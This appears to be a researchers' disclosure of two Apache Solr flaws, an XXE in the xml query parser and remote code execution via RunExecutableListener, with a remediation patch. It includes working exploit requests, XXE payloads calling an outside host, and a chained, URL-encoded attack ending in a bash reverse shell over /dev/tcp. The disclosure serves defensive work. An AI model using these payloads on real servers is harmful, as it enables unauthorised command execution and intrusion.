@@ -1,0 +1,186 @@
+First Vulnerability: XML External Entity Expansion (deftype=xmlparser) 
+
+Lucene includes a query parser that is able to create the full-spectrum of Lucene queries, using an XML data structure. Starting from version 5.1 Solr supports "xml" query parser in the search query.
+
+The problem is that lucene xml parser does not explicitly prohibit doctype declaration and expansion of external entities. It is possible to include special entities in the xml document, that point to external files (via file://) or external urls (via http://):
+
+Example usage: http://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://xxx.s.artsploit.com/xxx"'><a></a>'}
+
+When Solr is parsing this request, it makes a HTTP request to http://xxx.s.artsploit.com/xxx and treats its content as DOCTYPE definition. 
+
+Considering that we can define parser type in the search query, which is very often comes from untrusted user input, e.g. search fields on websites. It allows to an external attacker to make arbitrary HTTP requests to the local SOLR instance and to bypass all firewall restrictions.
+
+For example, this vulnerability could be user to send malicious data to the '/upload' handler:
+
+http://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://xxx.s.artsploit.com/solr/gettingstarted/upload?stream.body={"xx":"yy"}&commit=true"'><a></a>'}
+
+This vulnerability can also be exploited as Blind XXE using ftp wrapper in order to read arbitrary local files from the solrserver.
+
+Vulnerable code location:
+/solr/src/lucene/queryparser/src/java/org/apache/lucene/queryparser/xml/CoreParser.java
+
+static Document parseXML(InputStream pXmlFile) throws ParserException {
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder db = null;
+    try {
+      db = dbf.newDocumentBuilder();
+    }
+    catch (Exception se) {
+      throw new ParserException("XML Parser configuration error", se);
+    }
+    org.w3c.dom.Document doc = null;
+    try {
+      doc = db.parse(pXmlFile);
+    }
+  
+
+Steps to reproduce:
+
+1. Set up a listener on any port by using netcat command "nc -lv 4444"
+2. Open http://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://localhost:4444/executed"><a></a>'}
+3. You will see a request from the Solr server on your netcat listener. It proves that the DOCTYPE declaration is resolved.
+
+
+Remediation suggestions:
+
+Consider adding the following lines to /solr/src/lucene/queryparser/src/java/org/apache/lucene/queryparser/xml/CoreParser.java:
+
+static Document parseXML(InputStream pXmlFile) throws ParserException {
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder db = null;
+    try {
+      //protect from XXE attacks
+      dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+      dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+      dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+      
+      db = dbf.newDocumentBuilder();
+    }
+    catch (Exception se) {
+      throw new ParserException("XML Parser configuration error", se);
+    }
+    org.w3c.dom.Document doc = null;
+    try {
+      doc = db.parse(pXmlFile);
+    }
+  
+Links:
+https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet
+
+CVSS v2 base score: 9.0
+(AV:N/AC:L/Au:N/C:C/I:P/A:P)
+
+Second Vulnerability: Remote Code Execution (add-listener: RunExecutableListener)
+
+Solr "RunExecutableListener" class can be used to execute arbitrary commands on specific events, for example after each update query. The problem is that such listener can be enabled with any parameters just by using Config API with add-listener command.
+
+POST /solr/newcollection/config HTTP/1.1
+Host: localhost:8983
+Connection: close
+Content-Type: application/json  
+Content-Length: 198
+
+{
+  "add-listener" : {
+    "event":"postCommit",
+    "name":"newlistener",
+    "class":"solr.RunExecutableListener",
+    "exe":"ANYCOMMAND",
+    "dir":"/usr/bin/",
+    "args":["ANYARGS"]
+  }
+}
+
+Parameters "exe", "args" and "dir" can be crafted throught the HTTP request during modification of the collection's config. This means that anybody who can send a HTTP request to Solr API is able to execute arbitrary shell commands when "postCommit" event is fired. It leads to execution of arbitrary remote code for a remote attacker.
+
+Steps to reproduce:
+
+Step 1. Create a new collection:
+
+http://localhost:8983/solr/admin/collections?action=CREATE&name=newcollection&numShards=2
+
+Step 2. Set up a listener on any port by using netcat command "nc -lv 4444"
+
+Step 3. Add a new RunExecutableListener listener for the collection where "exe" attribute contents the name of running command ("/usr/bin/curl") and "args" attribute contents "http://localhost:4444/executed" value to make a request to the attacker's netcat listener:
+
+POST /solr/newcollection/config HTTP/1.1
+Host: localhost:8983
+Connection: close
+Content-Type: application/json  
+Content-Length: 198
+
+{
+  "add-listener" : {
+    "event":"postCommit",
+    "name":"newlistener",
+    "class":"solr.RunExecutableListener",
+    "exe":"curl",
+    "dir":"/usr/bin/",
+    "args":["http://localhost:4444/executed"]
+  }
+}
+
+Step 4. Update "newcollection" to trigger execution of RunExecutableListener: 
+
+POST /solr/newcollection/update HTTP/1.1
+Host: localhost:8983
+Connection: close
+Content-Type: application/json  
+Content-Length: 19
+
+[{"id":"test"}]
+
+Step 5. You will see a request from the Solr server on your netcat listener. It proves that the curl command is executed on the server.
+
+
+CVSS v2 base score: 10.0
+(AV:N/AC:L/Au:N/C:C/I:C/A:C)
+
+Summary:
+
+By chaining these two vulnerabilities, an external attacker can achieve remote code execution even without direct access to the Solr server. The only requirement is that the attacker should be able to specify a part of query that comes to "q"
+search parameter (which is a case for many web applications who use solr).
+
+Lets say that we have an attacker who can only send search queries ("q" param) to a "/select" solr endpoint.
+Here is the complete exploit scenario:
+
+Step 1. Create New collection via XXE. This step may be skipped if the attacker already knows any collection name.
+
+http://localhost:8983/solr/gettingstarted/select?q=%20%7b%21%78%6d%6c%70%61%72%73%65%72%20%76%3d%27%3c%21%44%4f%43%54%59%50%45%20%61%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%61%64%6d%69%6e%2f%63%6f%6c%6c%65%63%74%69%6f%6e%73%3f%61%63%74%69%6f%6e%3d%43%52%45%41%54%45%26%6e%61%6d%65%3d%6e%65%77%63%6f%6c%6c%65%63%74%69%6f%6e%26%6e%75%6d%53%68%61%72%64%73%3d%32%22%3e%3c%61%3e%3c%2f%61%3e%27%7d%20
+
+Without URL encode:
+
+http://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://localhost:8983/solr/admin/collections?action=CREATE&name=newcollection&numShards=2"><a></a>'}
+
+Step 2. Set up a netcat listener "nc -lv 4444"
+
+Step 3. Add a new RunExecutableListener listener via XXE
+
+http://localhost:8983/solr/newcollection/select?q=%7b%21%78%6d%6c%70%61%72%73%65%72%20%76%3d%27%3c%21%44%4f%43%54%59%50%45%20%61%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%6e%65%77%63%6f%6c%6c%65%63%74%69%6f%6e%2f%73%65%6c%65%63%74%3f%71%3d%78%78%78%26%71%74%3d%2f%73%6f%6c%72%2f%6e%65%77%63%6f%6c%6c%65%63%74%69%6f%6e%2f%63%6f%6e%66%69%67%3f%73%74%72%65%61%6d%2e%62%6f%64%79%3d%25%32%35%37%62%25%32%35%32%32%25%32%35%36%31%25%32%35%36%34%25%32%35%36%34%25%32%35%32%64%25%32%35%36%63%25%32%35%36%39%25%32%35%37%33%25%32%35%37%34%25%32%35%36%35%25%32%35%36%65%25%32%35%36%35%25%32%35%37%32%25%32%35%32%32%25%32%35%33%61%25%32%35%37%62%25%32%35%32%32%25%32%35%36%35%25%32%35%37%36%25%32%35%36%35%25%32%35%36%65%25%32%35%37%34%25%32%35%32%32%25%32%35%33%61%25%32%35%32%32%25%32%35%37%30%25%32%35%36%66%25%32%35%37%33%25%32%35%37%34%25%32%35%34%33%25%32%35%36%66%25%32%35%36%64%25%32%35%36%64%25%32%35%36%39%25%32%35%37%34%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%65%25%32%35%36%31%25%32%35%36%64%25%32%35%36%35%25%32%35%32%32%25%32%35%33%61%25%32%35%32%32%25%32%35%36%65%25%32%35%36%35%25%32%35%37%37%25%32%35%36%63%25%32%35%36%39%25%32%35%37%33%25%32%35%37%34%25%32%35%36%35%25%32%35%36%65%25%32%35%36%35%25%32%35%37%32%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%33%25%32%35%36%63%25%32%35%36%31%25%32%35%37%33%25%32%35%37%33%25%32%35%32%32%25%32%35%33%61%25%32%35%32%32%25%32%35%37%33%25%32%35%36%66%25%32%35%36%63%25%32%35%37%32%25%32%35%32%65%25%32%35%35%32%25%32%35%37%35%25%32%35%36%65%25%32%35%34%35%25%32%35%37%38%25%32%35%36%35%25%32%35%36%33%25%32%35%37%35%25%32%35%37%34%25%32%35%36%31%25%32%35%36%32%25%32%35%36%63%25%32%35%36%35%25%32%35%34%63%25%32%35%36%39%25%32%35%37%33%25%32%35%37%34%25%32%35%36%35%25%32%35%36%65%25%32%35%36%35%25%32%35%37%32%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%35%25%32%35%37%38%25%32%35%36%35%25%32%35%32%32%25%32%35%33%61%25%32%35%32%32%25%32%35%37%33%25%32%35%36%38%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%34%25%32%35%36%39%25%32%35%37%32%25%32%35%32%32%25%32%35%33%61%25%32%35%32%32%25%32%35%32%66%25%32%35%36%32%25%32%35%36%39%25%32%35%36%65%25%32%35%32%66%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%31%25%32%35%37%32%25%32%35%36%37%25%32%35%37%33%25%32%35%32%32%25%32%35%33%61%25%32%35%35%62%25%32%35%32%32%25%32%35%32%64%25%32%35%36%33%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%32%34%25%32%35%34%30%25%32%35%37%63%25%32%35%37%33%25%32%35%36%38%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%32%65%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%36%35%25%32%35%36%33%25%32%35%36%38%25%32%35%36%66%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%32%66%25%32%35%36%32%25%32%35%36%39%25%32%35%36%65%25%32%35%32%66%25%32%35%36%32%25%32%35%36%31%25%32%35%37%33%25%32%35%36%38%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%32%64%25%32%35%36%39%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%33%65%25%32%35%32%36%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%32%66%25%32%35%36%34%25%32%35%36%35%25%32%35%37%36%25%32%35%32%66%25%32%35%37%34%25%32%35%36%33%25%32%35%37%30%25%32%35%32%66%25%32%35%33%31%25%32%35%33%32%25%32%35%33%37%25%32%35%32%65%25%32%35%33%30%25%32%35%32%65%25%32%35%33%30%25%32%35%32%65%25%32%35%33%31%25%32%35%32%66%25%32%35%33%31%25%32%35%33%32%25%32%35%33%33%25%32%35%33%34%25%32%35%32%32%25%32%35%32%63%25%32%35%32%32%25%32%35%33%30%25%32%35%33%65%25%32%35%32%36%25%32%35%33%31%25%32%35%32%32%25%32%35%35%64%25%32%35%37%64%25%32%35%37%64%26%73%68%61%72%64%73%3d%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%22%3e%3c%61%3e%3c%2f%61%3e%27%7d
+
+Without URL encode:
+
+http://localhost:8983/solr/newcollection/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://localhost:8983/solr/newcollection/select?q=xxx&qt=/solr/newcollection/config?stream.body={"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c","$@|sh",".","echo","/bin/bash","-i",">&","/dev/tcp/127.0.0.1/1234","0>&1"]}}&shards=localhost:8983/"><a></a>'}
+
+As you may notice, in order to update the config we need to send a POST request to the application. But by using XXE vulnerability we can only send HTTP GET requests. There is a special trick is used here: If Solr receives "/select?q=123&qt=/xxx&shards=localhost:8983/" GET request, it actually converts it to POST and redirects this request to the shard specified in "shards" parameter. Which is also cool, it overwrites url query by the "qt" parameter, so we can convert it from "/select" to "/config". 
+The result HTTP request that is landed to localhost:8983/ will be POST request with stream.body="our_value". That is exactly what we need in terms of exploitation.
+
+Step 3. Update "newcollection" through XXE to trigger execution of RunExecutableListener
+
+http://localhost:8983/solr/newcollection/select?q=%7b%21%78%6d%6c%70%61%72%73%65%72%20%76%3d%27%3c%21%44%4f%43%54%59%50%45%20%61%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%6e%65%77%63%6f%6c%6c%65%63%74%69%6f%6e%2f%75%70%64%61%74%65%3f%73%74%72%65%61%6d%2e%62%6f%64%79%3d%25%35%62%25%37%62%25%32%32%25%36%39%25%36%34%25%32%32%25%33%61%25%32%32%25%34%31%25%34%31%25%34%31%25%32%32%25%37%64%25%35%64%26%63%6f%6d%6d%69%74%3d%74%72%75%65%26%6f%76%65%72%77%72%69%74%65%3d%74%72%75%65%22%3e%3c%61%3e%3c%2f%61%3e%27%7d%20
+
+Without URL encode:
+
+http://localhost:8983/solr/newcollection/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://localhost:8983/solr/newcollection/update?stream.body=[{"id":"AAA"}]&commit=true&overwrite=true"><a></a>'} 
+
+Step 5. When the "/bin/sh c $@|sh . echo /bin/bash -i >& /dev/tcp/127.0.0.1/1234 0>&1" command is executed during update, a new shell session will be opened on the netcat listener. An attacker can execute any shell command on the server where Solr is running.
+
+
+In all three requests Solr responds with different errors, but all of these error are happened after desired actions are executed.
+
+All these vulnerabilities were tested on the latest version of Apache Solr with the default cloud config (bin/solr start -e cloud -noprompt)
+
+These vulnerabilities were discovered by:
+Michael Stepankin (JPMorgan Chase)
+Olga Barinova (Gotham Digital Science)
